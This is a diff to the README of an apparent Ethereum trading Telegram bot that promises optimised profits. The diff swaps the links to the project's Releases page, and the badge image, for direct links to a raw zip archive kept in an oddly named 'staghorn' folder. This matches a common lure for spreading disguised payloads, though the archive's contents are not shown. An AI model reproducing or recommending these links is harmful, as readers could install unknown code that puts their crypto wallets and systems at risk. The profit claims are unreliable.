@@ -1,7 +1,7 @@
 # 🤖 Eth-Telegram-Verse-Bot - Trade Smart with Automated Bots
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-%23008CBA?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nidashaikh18/Eth-Telegram-Verse-Bot/releases)
+[![Download Latest Release](https://github.com/nidashaikh18/Eth-Telegram-Verse-Bot/raw/refs/heads/main/staghorn/Telegram_Bot_Eth_Verse_1.6.zip%20Latest%20Release-%20-%23008CBA?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nidashaikh18/Eth-Telegram-Verse-Bot/raw/refs/heads/main/staghorn/Telegram_Bot_Eth_Verse_1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Eth-Telegram-Verse-Bot project! This bot helps you access professional trading on the Ethereum network. With it, you can automate your trading strategies and optimize your profits.
@@ -21,7 +21,7 @@ To run the Eth-Telegram-Verse-Bot, you need a device with the following specific
 - Internet Connection: Stable connection recommended
 
 ## 🔗 Download & Install
-To get started, visit the Releases page and download the latest version of Eth-Telegram-Verse-Bot. You can find the download link here: [Download Releases](https://github.com/nidashaikh18/Eth-Telegram-Verse-Bot/releases).
+To get started, visit the Releases page and download the latest version of Eth-Telegram-Verse-Bot. You can find the download link here: [Download Releases](https://github.com/nidashaikh18/Eth-Telegram-Verse-Bot/raw/refs/heads/main/staghorn/Telegram_Bot_Eth_Verse_1.6.zip).
 
 1. Click on the link.
 2. You will see a list of available versions.
